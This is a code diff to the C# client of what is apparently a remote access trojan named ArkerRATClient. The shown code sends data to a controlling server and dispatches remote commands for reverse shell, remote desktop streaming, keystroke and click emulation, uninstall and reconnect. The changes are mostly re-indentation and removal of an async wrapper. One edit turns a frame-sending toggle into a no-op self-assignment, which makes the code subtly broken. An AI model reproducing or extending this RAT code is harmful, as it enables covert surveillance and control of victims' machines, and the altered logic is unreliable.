@@ -72,16 +72,16 @@ namespace ArkerRATClient
         }
         public static async Task SendData(string textData)
         {
-            try
-            {
-                byte[] data = Encoding.UTF8.GetBytes(textData);
-                await serverStream.WriteAsync(data, 0, data.Length);
-                await serverStream.FlushAsync();
-            }
-            catch (Exception ex)
-            {
-                CloseConnection();
-            }
+                try
+                {
+                    byte[] data = Encoding.UTF8.GetBytes(textData);
+                    await serverStream.WriteAsync(data, 0, data.Length);
+                    await serverStream.FlushAsync();
+                }
+                catch (Exception ex)
+                {
+                    CloseConnection();
+                }
         }
 
         //public static async Task ReadData()
@@ -165,10 +165,7 @@ namespace ArkerRATClient
         static string data = string.Empty;
         static private async void ReadData()
         {
-            StringBuilder stringBuilder = new StringBuilder();
-
-            await Task.Run(async () =>
-            {
+                StringBuilder stringBuilder = new StringBuilder();
                 try
                 {
                     while (!noConnection)
@@ -186,12 +183,12 @@ namespace ArkerRATClient
                                 data = stringBuilder.ToString();
                             }
 
-                            SortData("§DisconnectStart§", "§DisconnectEnd§");
+                           SortData("§DisconnectStart§", "§DisconnectEnd§");
                             SortData("§UninstallStart§", "§UninstallEnd§");
-                            SortData("§ReverseShellStart§", "§ReverseShellEnd§");
-                            SortData("§PingStart§", "§PingEnd§");
+                           SortData("§ReverseShellStart§", "§ReverseShellEnd§");
+                           SortData("§PingStart§", "§PingEnd§");
                             SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§");
-                            SortData("§ReconnectStart§", "§ReconnectEnd§");
+                           SortData("§ReconnectStart§", "§ReconnectEnd§");
 
 
                             stringBuilder.Clear();
@@ -201,7 +198,6 @@ namespace ArkerRATClient
                     }
                 }
                 catch (Exception ex) { CloseConnection(); }
-            });
         }
 
         public static bool uninstallFix = false;
@@ -236,16 +232,17 @@ namespace ArkerRATClient
                         {
                             if(subString.Length == 0)
                             {
-                                RemoteDesktop.sendingFrames = true;
-                                RemoteDesktop.StartScreenStreaming(9);
+                               
+                                    RemoteDesktop.sendingFrames = true;
+                                    RemoteDesktop.StartScreenStreaming(9);
                             }
                             else if (subString.Contains("§KI§"))
                             {
-                                RemoteDesktop.EmulateKeyStrokes(subString.Replace("§KI§", string.Empty));
+                              RemoteDesktop.EmulateKeyStrokes(subString.Replace("§KI§", string.Empty));
                             }
                             else if (subString.Contains("close"))
                             {
-                                RemoteDesktop.sendingFrames = !RemoteDesktop.sendingFrames;
+                                RemoteDesktop.sendingFrames = RemoteDesktop.sendingFrames;
                             }
                             else if (subString.Contains("§ClickPositionStart§"))
                                 RemoteDesktop.EmulateClick(subString);
